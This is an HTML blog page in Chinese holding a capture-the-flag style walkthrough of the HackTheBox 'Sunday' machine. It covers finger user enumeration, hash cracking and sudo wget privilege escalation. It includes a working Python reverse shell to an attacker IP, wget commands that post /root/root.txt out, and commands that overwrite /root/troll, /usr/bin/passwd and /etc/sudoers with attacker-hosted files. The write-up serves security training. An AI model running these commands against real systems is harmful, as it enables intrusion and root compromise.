@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Reconnaissance1nmap -sT -p- --min-rate 5000 10.10.10.76  1234567Not shown: 59441 filtered tcp ports (no-response), 6089 closed tcp ports (conn-refused)PORT      STATE SERVICE79&#x2F;tcp    open  finger111&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Sunday">
+<meta property="og:url" content="http://example.com/2023/10/01/HackTheBox-Sunday/index.html">
+<meta property="og:site_name" content="踟蹰者的歌">
+<meta property="og:description" content="Reconnaissance1nmap -sT -p- --min-rate 5000 10.10.10.76  1234567Not shown: 59441 filtered tcp ports (no-response), 6089 closed tcp ports (conn-refused)PORT      STATE SERVICE79&#x2F;tcp    open  finger111&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-10-01T15:29:53.000Z">
+<meta property="article:modified_time" content="2024-01-21T14:34:44.917Z">
+<meta property="article:author" content="yu1e">
+<meta property="article:tag" content="HTB">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox-Sunday</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2023/10/01/HackTheBox-Shocker/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/10/01/Kali%E7%9A%84eth0%E7%BD%91%E5%8D%A1%E6%B2%A1%E6%9C%89ip%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/10/01/HackTheBox-Sunday/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/10/01/HackTheBox-Sunday/&text=HackTheBox-Sunday"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/10/01/HackTheBox-Sunday/&title=HackTheBox-Sunday"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/10/01/HackTheBox-Sunday/&is_video=false&description=HackTheBox-Sunday"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox-Sunday&body=Check out this article: http://example.com/2023/10/01/HackTheBox-Sunday/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/10/01/HackTheBox-Sunday/&title=HackTheBox-Sunday"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/10/01/HackTheBox-Sunday/&title=HackTheBox-Sunday"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/10/01/HackTheBox-Sunday/&title=HackTheBox-Sunday"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/10/01/HackTheBox-Sunday/&title=HackTheBox-Sunday"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/10/01/HackTheBox-Sunday/&name=HackTheBox-Sunday&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/10/01/HackTheBox-Sunday/&t=HackTheBox-Sunday"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Reconnaissance"><span class="toc-number">1.</span> <span class="toc-text">Reconnaissance</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Get-Shell"><span class="toc-number">2.</span> <span class="toc-text">Get Shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">3.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#root-using-wget"><span class="toc-number">3.1.</span> <span class="toc-text">root using wget</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%93input-file"><span class="toc-number">3.1.1.</span> <span class="toc-text">–input-file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POST-Flag"><span class="toc-number">3.1.2.</span> <span class="toc-text">POST Flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A6%86%E7%9B%96troll%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96ROOT-shell"><span class="toc-number">3.1.3.</span> <span class="toc-text">覆盖troll文件获取ROOT shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A6%86%E5%86%99%E5%85%B6%E4%BB%96%E7%9A%84-SUID-%E6%96%87%E4%BB%B6"><span class="toc-number">3.1.4.</span> <span class="toc-text">覆写其他的 SUID 文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A6%86%E5%86%99sudoers%E6%96%87%E4%BB%B6"><span class="toc-number">3.1.5.</span> <span class="toc-text">覆写sudoers文件</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox-Sunday
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">yu1e</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-10-01T15:29:53.000Z" class="dt-published" itemprop="datePublished">2023-10-01</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/HTB/" rel="tag">HTB</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -p- --min-rate 5000 10.10.10.76</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Not shown: 59441 filtered tcp ports (no-response), 6089 closed tcp ports (conn-refused)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">79/tcp    open  finger</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">515/tcp   open  printer</span><br><span class="line">6787/tcp  open  smc-admin</span><br><span class="line">22022/tcp open  unknown</span><br></pre></td></tr></table></figure>
+
+<p>Google查一下</p>
+<p><strong>Finger</strong> is a program you can use to find information about computer users. It usually lists the login name, the full name, and possibly other details about the user you are fingering.</p>
+<p>使用<code>finger @host</code>如果服务器没有用户登录的情况下，不一定能查到用户，此时需要暴力枚举</p>
+<p>工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pentestmonkey.net/tools/user-enumeration/finger-user-enum</span><br></pre></td></tr></table></figure>
+
+<p>暴力破解用户名</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./finger-user-enum.pl -U /home/harry/Desktop/hackTools/Dic/names.txt -t 10.10.10.76</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">######## Scan started at Sat Jan 20 22:01:44 2024 #########</span><br><span class="line">access@10.10.10.76: access No Access User                     &lt; .  .  .  . &gt;</span><br><span class="line">nobody4  SunOS 4.x NFS Anonym               &lt; .  .  .  . &gt;</span><br><span class="line">line@10.10.10.76: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 &lt; .  .  .  . &gt;</span><br><span class="line"></span><br><span class="line">message@10.10.10.76: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               &lt; .  .  .  . &gt;</span><br><span class="line">sammy@10.10.10.76: sammy           ???            ssh          &lt;Apr 13, 2022&gt; 10.10.14.13         </span><br><span class="line">sunny@10.10.10.76: sunny           ???            ssh          &lt;Apr 13, 2022&gt; 10.10.14.13         </span><br><span class="line">sys@10.10.10.76: sys             ???                         &lt; .  .  .  . &gt;</span><br><span class="line">access@10.10.10.76: access No Access User                     &lt; .  .  .  . &gt; nobody4  SunOS 4.x NFS Anonym               &lt; .  .  .  . &gt;</span><br><span class="line">admin@10.10.10.76: Login       Name               TTY         Idle    When    Where..adm      Admin                              &lt; .  .  .  . &gt;dladm    Datalink Admin                     &lt; .  .  .  . &gt;..netadm   Network Admin                      &lt; .  .  .  . &gt;..netcfg   Network Configuratio               &lt; .  .  .  . &gt;..dhcpserv DHCP Configuration A               &lt; .  .  .  . &gt;..ikeuser  IKE Admin                          &lt; .  .  .  . &gt;..lp       Line Printer Admin                 &lt; .  .  .  . &gt;..</span><br></pre></td></tr></table></figure>
+
+<p>发现用户sunny和Sammy</p>
+<h1 id="Get-Shell"><a href="#Get-Shell" class="headerlink" title="Get Shell"></a>Get Shell</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 22022 sunny@10.10.10.76</span><br></pre></td></tr></table></figure>
+
+<p>密码sunday</p>
+<p>在backup&#x2F;shadow.backup 中发现用户的hash密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sunny@sunday:/home$ cd ..</span><br><span class="line">sunny@sunday:/$ ls</span><br><span class="line">backup    cdrom     etc       kernel    mnt       opt       root      system    var</span><br><span class="line">bin       dev       export    lib       net       platform  rpool     tmp       zvboot</span><br><span class="line">boot      devices   home      media     nfs4      proc      sbin      usr</span><br><span class="line">sunny@sunday:/$ cd backup/</span><br><span class="line">sunny@sunday:/backup$ ls</span><br><span class="line">agent22.backup  shadow.backup</span><br><span class="line">sunny@sunday:/backup$ cat shadow.backup </span><br><span class="line">mysql:NP:::::::</span><br><span class="line">openldap:*LK*:::::::</span><br><span class="line">webservd:*LK*:::::::</span><br><span class="line">postgres:NP:::::::</span><br><span class="line">svctag:*LK*:6445::::::</span><br><span class="line">nobody:*LK*:6445::::::</span><br><span class="line">noaccess:*LK*:6445::::::</span><br><span class="line">nobody4:*LK*:6445::::::</span><br><span class="line">sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::</span><br><span class="line">sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::</span><br></pre></td></tr></table></figure>
+
+<p>破解hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 7400 sunday.hashes /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure>
+
+<p>这里的-m参数是指定hash的格式，需要根据shadow文件中hash去查是什么格式的</p>
+<p>成功登录Sammy</p>
+<h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><h2 id="root-using-wget"><a href="#root-using-wget" class="headerlink" title="root using wget"></a>root using wget</h2><p>执行sudo -l</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.1$ sudo -l</span><br><span class="line">User sammy may run the following commands on sunday:</span><br><span class="line">    (ALL) ALL</span><br><span class="line">    (root) NOPASSWD: /usr/bin/wget</span><br></pre></td></tr></table></figure>
+
+<h3 id="–input-file"><a href="#–input-file" class="headerlink" title="–input-file"></a>–input-file</h3><p>可以使用<code>--input-file</code> or <code>-i</code> ，此参数允许用户在文件中提供一个url去访问，当文件中不是url而是一个hash时，会在报错信息中返回文件的内容</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.1$ sudo wget --input-file /root/root.txt</span><br><span class="line">--2024-01-21 03:46:26--  http://b5923e03c964e6f097ccac3e4fc0f595/</span><br><span class="line">Resolving b5923e03c964e6f097ccac3e4fc0f595 (b5923e03c964e6f097ccac3e4fc0f595)... failed: temporary name resolution failure.</span><br><span class="line">wget: unable to resolve host address ‘b5923e03c964e6f097ccac3e4fc0f595’</span><br></pre></td></tr></table></figure>
+
+<h3 id="POST-Flag"><a href="#POST-Flag" class="headerlink" title="POST Flag"></a>POST Flag</h3><p>可以使用–post-file参数指定使用POST方法的参数，文件内容会被当成参数传给HTTP服务器上</p>
+<p>但是python3开启的httpserver不支持POST方法</p>
+<p>由于只是需要读取文件内容，使用nc命令监听端口，然后连接端口可以达到此效果</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─$ nc -lvnp 4444                           </span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.14.4] from (UNKNOWN) [10.10.10.76] 43755</span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">User-Agent: Wget/1.20.3 (solaris2.11)</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Host: 10.10.14.4:4444</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 33</span><br><span class="line"></span><br><span class="line">b5923e03c964e6f097ccac3e4fc0f595</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.1$ sudo /usr/bin/wget --post-file /root/root.txt http://10.10.14.4:4444</span><br><span class="line">--2024-01-21 04:56:12--  http://10.10.14.4:4444/</span><br><span class="line">Connecting to 10.10.14.4:4444... connected.</span><br><span class="line">HTTP request sent, awaiting response... </span><br></pre></td></tr></table></figure>
+
+<h3 id="覆盖troll文件获取ROOT-shell"><a href="#覆盖troll文件获取ROOT-shell" class="headerlink" title="覆盖troll文件获取ROOT shell"></a>覆盖troll文件获取ROOT shell</h3><p>之前在以sunny用户登录的时候，发现可以使用root权限执行troll命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sunny@sunday:~$ sudo -l </span><br><span class="line">User sunny may run the following commands on this host:    </span><br><span class="line">	(root) NOPASSWD: /root/troll</span><br></pre></td></tr></table></figure>
+
+<p>攻击机上创建一个python的反弹shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket <span class="keyword">import</span> subprocess <span class="keyword">import</span> os </span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) </span><br><span class="line">s.connect((<span class="string">&quot;10.10.14.5&quot;</span>,<span class="number">443</span>)) </span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>) </span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>) </span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>) </span><br><span class="line">p = subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>下载该文件，使用-O参数指定下载的目标文件，重写troll文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wget http://10.10.14.4/shell.py -O /root/troll</span><br></pre></td></tr></table></figure>
+
+<p>本地开启监听，然后执行troll命令，但是这里需要非常快，因为overwrite脚本会每5秒重置troll文件</p>
+<h3 id="覆写其他的-SUID-文件"><a href="#覆写其他的-SUID-文件" class="headerlink" title="覆写其他的 SUID 文件"></a>覆写其他的 SUID 文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sammy@sunday:~$ ls -la /usr/bin/passwd </span><br><span class="line">-r-sr-sr-x 1 root sys 31584 2009-05-14 21:18 /usr/bin/passwd</span><br><span class="line">sammy@sunday:~$ sudo wget -O /usr/bin/passwd http://10.10.14.5/shell.py</span><br><span class="line">--02:09:34--  http://10.10.14.4/shell.py</span><br><span class="line">           =&gt; `/usr/bin/passwd&#x27;</span><br><span class="line">Connecting to 10.10.14.5:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 246 [application/octet-stream]</span><br><span class="line"></span><br><span class="line">100%[==========================================================================================================================================================================================================&gt;] 246           --.--K/s</span><br><span class="line"></span><br><span class="line">02:09:34 (69.91 KB/s) - `/usr/bin/passwd&#x27; saved [246/246]</span><br><span class="line"></span><br><span class="line">sammy@sunday:~$ passwd</span><br></pre></td></tr></table></figure>
+
+<h3 id="覆写sudoers文件"><a href="#覆写sudoers文件" class="headerlink" title="覆写sudoers文件"></a>覆写sudoers文件</h3><p><code>/etc/sudoers</code>定义了什么用户可以以root权限运行何种程序</p>
+<p>然后我们在本地新建一个文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root  ALL=(ALL) ALL</span><br><span class="line">sammy ALL=(root) NOPASSWD: /usr/bin/su</span><br><span class="line">sunny ALL=(root) NOPASSWD: /root/troll</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wget -O /etc/sudoers http://10.10.14.4/sudoers</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Reconnaissance"><span class="toc-number">1.</span> <span class="toc-text">Reconnaissance</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Get-Shell"><span class="toc-number">2.</span> <span class="toc-text">Get Shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">3.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#root-using-wget"><span class="toc-number">3.1.</span> <span class="toc-text">root using wget</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%93input-file"><span class="toc-number">3.1.1.</span> <span class="toc-text">–input-file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POST-Flag"><span class="toc-number">3.1.2.</span> <span class="toc-text">POST Flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A6%86%E7%9B%96troll%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96ROOT-shell"><span class="toc-number">3.1.3.</span> <span class="toc-text">覆盖troll文件获取ROOT shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A6%86%E5%86%99%E5%85%B6%E4%BB%96%E7%9A%84-SUID-%E6%96%87%E4%BB%B6"><span class="toc-number">3.1.4.</span> <span class="toc-text">覆写其他的 SUID 文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A6%86%E5%86%99sudoers%E6%96%87%E4%BB%B6"><span class="toc-number">3.1.5.</span> <span class="toc-text">覆写sudoers文件</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/10/01/HackTheBox-Sunday/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/10/01/HackTheBox-Sunday/&text=HackTheBox-Sunday"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/10/01/HackTheBox-Sunday/&title=HackTheBox-Sunday"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/10/01/HackTheBox-Sunday/&is_video=false&description=HackTheBox-Sunday"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox-Sunday&body=Check out this article: http://example.com/2023/10/01/HackTheBox-Sunday/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/10/01/HackTheBox-Sunday/&title=HackTheBox-Sunday"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/10/01/HackTheBox-Sunday/&title=HackTheBox-Sunday"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/10/01/HackTheBox-Sunday/&title=HackTheBox-Sunday"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/10/01/HackTheBox-Sunday/&title=HackTheBox-Sunday"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/10/01/HackTheBox-Sunday/&name=HackTheBox-Sunday&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/10/01/HackTheBox-Sunday/&t=HackTheBox-Sunday"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    yu1e
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
